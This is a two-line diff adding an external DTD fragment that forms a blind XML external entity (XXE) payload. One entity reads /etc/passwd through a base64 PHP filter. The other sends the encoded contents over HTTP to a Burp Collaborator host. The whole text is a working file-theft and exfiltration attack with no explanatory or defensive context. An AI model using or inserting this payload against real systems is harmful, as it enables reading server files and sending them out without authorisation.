@@ -1,0 +1,2 @@
+<!ENTITY % git SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % connect "<!ENTITY xxe SYSTEM 'http://o8xhvxpy4crtcu3g63vsux6wrnxfl4.burpcollaborator.net/%git;'>">
